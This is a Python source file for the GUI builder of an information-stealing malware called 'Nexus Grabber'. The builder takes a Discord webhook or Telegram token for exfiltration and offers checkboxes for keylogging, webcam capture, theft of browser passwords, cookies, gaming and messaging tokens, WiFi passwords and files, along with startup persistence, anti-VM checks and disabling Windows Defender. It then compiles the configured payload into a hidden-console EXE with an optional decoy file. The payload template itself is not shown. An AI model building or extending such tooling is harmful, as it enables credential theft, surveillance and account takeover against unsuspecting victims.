import customtkinter as ctk
import subprocess, sys, os, tempfile, json, base64, shutil, threading
from tkinter import filedialog, messagebox
from pathlib import Path

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

APP_DIR = Path(__file__).parent
TEMPLATE_PATH = APP_DIR / "Nexus_template.py"

class BuilderGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Nexus Grabber cracked xd")
        self.geometry("800x700")
        self.resizable(True, True)

        self.scroll_frame = ctk.CTkScrollableFrame(self, fg_color="transparent")
        self.scroll_frame.pack(pady=0, padx=0, fill="both", expand=True)

        # Webhook
        ctk.CTkLabel(self.scroll_frame, text="Discord Webhook URL:", anchor="w").pack(pady=(15,0), padx=20, fill="x")
        self.webhook_entry = ctk.CTkEntry(self.scroll_frame, placeholder_text="https://discord.com/api/webhooks/...")
        self.webhook_entry.pack(pady=(5,10), padx=20, fill="x")

        # Telegram (optional)
        ctk.CTkLabel(self.scroll_frame, text="Telegram Token (optional):", anchor="w").pack(pady=(5,0), padx=20, fill="x")
        self.telegram_token = ctk.CTkEntry(self.scroll_frame, placeholder_text="Leave blank if using Discord only")
        self.telegram_token.pack(pady=(2,5), padx=20, fill="x")
        ctk.CTkLabel(self.scroll_frame, text="Telegram Chat ID:", anchor="w").pack(pady=(2,0), padx=20, fill="x")
        self.telegram_chat = ctk.CTkEntry(self.scroll_frame, placeholder_text="")
        self.telegram_chat.pack(pady=(2,10), padx=20, fill="x")

        # Features
        frame = ctk.CTkFrame(self.scroll_frame)
        frame.pack(pady=5, padx=20, fill="both")
        ctk.CTkLabel(frame, text="Features:", font=("Arial", 16)).pack(pady=(10,5))

        self.checkboxes = {}
        features = [
            ("SCREENSHOT", "Screenshot Capture"),
            ("CLIPBOARD", "Clipboard Capture"),
            ("WEBCAM", "Webcam Photo"),
            ("KEYLOGGER", "Keylogger"),
            ("DISCORD_TOKENS", "Steal Discord Tokens"),
            ("DISCORD_FILES", "Steal Discord Files"),
            ("BROWSER_PASSWORDS", "Steal Browser Passwords"),
            ("COOKIES", "Steal Browser Cookies"),
            ("AUTOFILL", "Steal Autofill Data"),
            ("WIFI_PASSWORDS", "Steal WiFi Passwords"),
            ("STEAM_CONFIG", "Steal Steam Config"),
            ("MINECRAFT_TOKENS", "Steal Minecraft Tokens"),
            ("TELEGRAM_SESSION", "Steal Telegram Session"),
            ("FILE_GRABBER", "File Grabber"),
            ("LOG_IP", "Log Public IP"),
            ("STARTUP", "Add to Startup"),
            ("SELF_REMOVE", "Self Destruct After Run"),
            ("ANTI_VM", "Anti-VM Detection"),
            ("ANTI_ANALYSIS", "Anti-Analysis (Process Check)"),
            ("MUTEX", "Single Instance (Mutex)"),
            ("DISABLE_DEFENDER", "Disable Windows Defender"),
            ("WAIT_FOR_MOUSE", "Wait for Mouse Movement"),
            ("PING_ALL", "@everyone Ping on Webhook"),
            ("ROBLOX_COOKIES", "Steal Roblox Cookie"),
        ]
        for key, label in features:
            var = ctk.BooleanVar(value=True)
            cb = ctk.CTkCheckBox(frame, text=label, variable=var)
            cb.pack(anchor="w", padx=20, pady=1)
            self.checkboxes[key] = var

        # Extra options
        opt_frame = ctk.CTkFrame(self.scroll_frame)
        opt_frame.pack(pady=10, padx=20, fill="both")
        ctk.CTkLabel(opt_frame, text="Extra Options:", font=("Arial", 16)).pack(pady=(10,5))

        ctk.CTkLabel(opt_frame, text="AES Key (base64, optional):").pack(anchor="w", padx=20)
        self.aes_key = ctk.CTkEntry(opt_frame, placeholder_text="Leave blank for no encryption")
        self.aes_key.pack(pady=(2,5), padx=20, fill="x")

        ctk.CTkLabel(opt_frame, text="ZIP Password (for grabbed files):").pack(anchor="w", padx=20)
        self.zip_password = ctk.CTkEntry(opt_frame, placeholder_text="")
        self.zip_password.pack(pady=(2,5), padx=20, fill="x")

        ctk.CTkLabel(opt_frame, text="File Extensions to Grab (comma-separated):").pack(anchor="w", padx=20)
        self.file_exts = ctk.CTkEntry(opt_frame, placeholder_text=".txt,.docx,.pdf,.png,.jpg")
        self.file_exts.insert(0, ".txt,.docx,.pdf,.png,.jpg,.xlsx,.pptx,.zip")
        self.file_exts.pack(pady=(2,5), padx=20, fill="x")

        ctk.CTkLabel(opt_frame, text="Folders to Grab from (comma-separated):").pack(anchor="w", padx=20)
        self.grab_folders = ctk.CTkEntry(opt_frame, placeholder_text="Desktop,Documents,Downloads")
        self.grab_folders.insert(0, "Desktop,Documents,Downloads")
        self.grab_folders.pack(pady=(2,5), padx=20, fill="x")

        ctk.CTkLabel(opt_frame, text="Decoy File to Open (optional):").pack(anchor="w", padx=20)
        self.decoy_file = ctk.CTkEntry(opt_frame, placeholder_text=r"C:\path\to\innocent.pdf")
        self.decoy_file.pack(pady=(2,10), padx=20, fill="x")

        # Output name
        ctk.CTkLabel(self.scroll_frame, text="Output EXE Name:", anchor="w").pack(pady=(5,0), padx=20, fill="x")
        self.output_name = ctk.CTkEntry(self.scroll_frame, placeholder_text="NexusPayload")
        self.output_name.insert(0, "NexusPayload")
        self.output_name.pack(pady=(2,10), padx=20, fill="x")

        # Build button
        self.build_btn = ctk.CTkButton(self.scroll_frame, text="BUILD PAYLOAD", command=self.build, height=40, font=("Arial", 14))
        self.build_btn.pack(pady=5, padx=20, fill="x")

        # Status
        self.status = ctk.CTkTextbox(self.scroll_frame, height=120)
        self.status.pack(pady=(5,10), padx=20, fill="both")
        self.status.insert("end", "Ready.\n")
        self.status.configure(state="disabled")

        ctk.CTkLabel(self.scroll_frame, text="Authorized Penetration Testing Tool Only", font=("Arial", 9), text_color="gray").pack(pady=(0,5))

    def log(self, msg):
        self.status.configure(state="normal")
        self.status.insert("end", msg + "\n")
        self.status.see("end")
        self.status.configure(state="disabled")

    def build(self):
        webhook = self.webhook_entry.get().strip()
        if not webhook:
            messagebox.showerror("Error", "Webhook URL is required")
            return
        threading.Thread(target=self._build_thread, daemon=True).start()

    def _build_thread(self):
        try:
            self.build_btn.configure(state="disabled", text="Building...")
            self.log("Reading template...")

            with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
                template = f.read()

            # Fill in placeholders
            replacements = {
                "{WEBHOOK}": self.webhook_entry.get().strip(),
                "{TELEGRAM_TOKEN}": self.telegram_token.get().strip(),
                "{TELEGRAM_CHAT_ID}": self.telegram_chat.get().strip(),
                "{AES_KEY}": self.aes_key.get().strip(),
                "{ZIP_PASSWORD}": self.zip_password.get().strip(),
                "{FILE_EXTENSIONS}": self.file_exts.get().strip(),
                "{GRAB_FOLDERS}": self.grab_folders.get().strip(),
                "{DECOY_FILE}": self.decoy_file.get().strip(),
            }
            for key, var in self.checkboxes.items():
                replacements["{" + key + "}"] = "True" if var.get() else "False"

            payload = template
            for ph, val in replacements.items():
                payload = payload.replace(ph, val)

            # Write filled payload
            build_dir = APP_DIR / "build_temp"
            build_dir.mkdir(exist_ok=True)
            payload_path = build_dir / "payload.py"
            with open(payload_path, "w", encoding="utf-8") as f:
                f.write(payload)

            self.log("Payload script written. Compiling with PyInstaller...")

            out_name = self.output_name.get().strip() or "NexusPayload"
            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile", "--noconsole",
                "--name", out_name,
                "--distpath", str(APP_DIR / "dist"),
                "--workpath", str(build_dir / "build"),
                "--specpath", str(build_dir),
                "--hidden-import", "win32com",
                "--hidden-import", "win32clipboard",
                "--hidden-import", "win32crypt",
                "--hidden-import", "win32event",
                "--hidden-import", "win32api",
                "--hidden-import", "pywintypes",
                "--hidden-import", "Crypto",
                "--hidden-import", "Crypto.Cipher",
                "--hidden-import", "PIL",
                "--hidden-import", "PIL.ImageGrab",
                "--hidden-import", "psutil",
            ]
            cmd.append(str(payload_path))

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                self.log(f"SUCCESS! Payload in: {APP_DIR / 'dist' / (out_name + '.exe')}")
                messagebox.showinfo("Success", f"Payload built!\n{APP_DIR / 'dist' / (out_name + '.exe')}")
            else:
                self.log(f"Build failed:\n{result.stderr[-600:]}")
                messagebox.showerror("Error", "Build failed. Check log.")
        except Exception as e:
            self.log(f"Error: {e}")
            messagebox.showerror("Error", str(e))
        finally:
            self.build_btn.configure(state="normal", text="BUILD PAYLOAD")

if __name__ == "__main__":
    app = BuilderGUI()
    app.mainloop()
